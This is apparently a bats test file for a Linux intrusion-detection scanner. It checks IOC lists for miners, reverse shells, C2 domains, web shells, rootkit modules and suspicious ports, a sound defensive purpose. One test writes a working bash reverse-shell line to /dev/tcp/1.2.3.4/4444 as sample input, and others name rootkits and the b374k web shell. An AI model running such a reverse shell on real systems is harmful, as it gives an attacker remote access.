#!/usr/bin/env bats
# test_ioc_match.bats — v3.0: IOC files + new lib/ files

setup() {
    export REPO_ROOT="$(cd "$(dirname "$BATS_TEST_FILENAME")/.." && pwd)"
    export IOC_DIR="$REPO_ROOT/lib/iocs"
    export LIB_DIR="$REPO_ROOT/lib"
}

@test "miner IOC matches xmrig string" {
    [ -f "$IOC_DIR/miners.txt" ]
    echo "PID 1234 /usr/bin/xmrig --config=cfg.json" > /tmp/_fake_proc.txt
    run grep -F -f "$IOC_DIR/miners.txt" /tmp/_fake_proc.txt
    [ "$status" -eq 0 ]
    [[ "$output" == *"xmrig"* ]]
    rm -f /tmp/_fake_proc.txt
}

@test "rshell IOC catches /dev/tcp/ pattern" {
    [ -f "$IOC_DIR/rshell.txt" ]
    echo "bash -i >& /dev/tcp/1.2.3.4/4444" > /tmp/_fake_rsh.txt
    run grep -F -f "$IOC_DIR/rshell.txt" /tmp/_fake_rsh.txt
    [ "$status" -eq 0 ]
    [[ "$output" == *"/dev/tcp/"* ]]
    rm -f /tmp/_fake_rsh.txt
}

@test "c2 IOC catches suspicious .tk domain" {
    [ -f "$IOC_DIR/c2.txt" ]
    echo "Resolved: evil-c2.tk" > /tmp/_fake_dns.txt
    run grep -F -f "$IOC_DIR/c2.txt" /tmp/_fake_dns.txt
    [ "$status" -eq 0 ]
    [[ "$output" == *".tk"* ]]
    rm -f /tmp/_fake_dns.txt
}

@test "backdoors IOC catches b374k.php" {
    [ -f "$IOC_DIR/backdoors.txt" ]
    echo "/var/www/b374k.php" > /tmp/_fake_ws.txt
    run grep -F -f "$IOC_DIR/backdoors.txt" /tmp/_fake_ws.txt
    [ "$status" -eq 0 ]
    [[ "$output" == *"b374k.php"* ]]
    rm -f /tmp/_fake_ws.txt
}

@test "rootkit signatures file exists and has 30+ entries" {
    [ -f "$LIB_DIR/rootkit_signatures.txt" ]
    count=$(grep -cvE '^\s*$|^\s*#' "$LIB_DIR/rootkit_signatures.txt")
    [ "$count" -ge 30 ]
}

@test "bad_lkm file contains known rootkit modules" {
    [ -f "$LIB_DIR/bad_lkm.txt" ]
    grep -q "^diamorphine$" "$LIB_DIR/bad_lkm.txt"
    grep -q "^suterusu$" "$LIB_DIR/bad_lkm.txt"
    grep -q "^reptile$" "$LIB_DIR/bad_lkm.txt"
}

@test "suid_whitelist exists and has passwd/sudo" {
    [ -f "$LIB_DIR/suid_whitelist.txt" ]
    grep -q "/usr/bin/passwd" "$LIB_DIR/suid_whitelist.txt"
    grep -q "/usr/bin/sudo" "$LIB_DIR/suid_whitelist.txt"
}

@test "suspicious_ports exists and has 4444" {
    [ -f "$LIB_DIR/suspicious_ports.txt" ]
    grep -q ":4444" "$LIB_DIR/suspicious_ports.txt"
}

@test "suspicious_tlds exists and has .tk" {
    [ -f "$LIB_DIR/suspicious_tlds.txt" ]
    grep -q "^\.tk$" "$LIB_DIR/suspicious_tlds.txt"
}

@test "scan_tools exists and has nmap" {
    [ -f "$LIB_DIR/scan_tools.txt" ]
    grep -q "^nmap$" "$LIB_DIR/scan_tools.txt"
}

@test "lateral_procs exists and has ssh -R" {
    [ -f "$LIB_DIR/lateral_procs.txt" ]
    grep -q "^ssh -R$" "$LIB_DIR/lateral_procs.txt"
}

@test "default_capabilities exists" {
    [ -f "$LIB_DIR/default_capabilities.txt" ]
}

@test "bpftrace_monitor.bt exists" {
    [ -f "$LIB_DIR/bpftrace_monitor.bt" ]
    grep -q "bpftrace" "$LIB_DIR/bpftrace_monitor.bt"
}

@test "Maltrail attribution notice exists" {
    [ -f "$IOC_DIR/LICENSE.notice" ]
    grep -q "stamparm/maltrail" "$IOC_DIR/LICENSE.notice"
}

@test "negative: legitimate SSH config does NOT trigger rshell IOC" {
    [ -f "$IOC_DIR/rshell.txt" ]
    cat > /tmp/_legit.txt <<'EOF'
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
EOF
    run grep -F -f "$IOC_DIR/rshell.txt" /tmp/_legit.txt
    [ "$status" -ne 0 ]
    rm -f /tmp/_legit.txt
}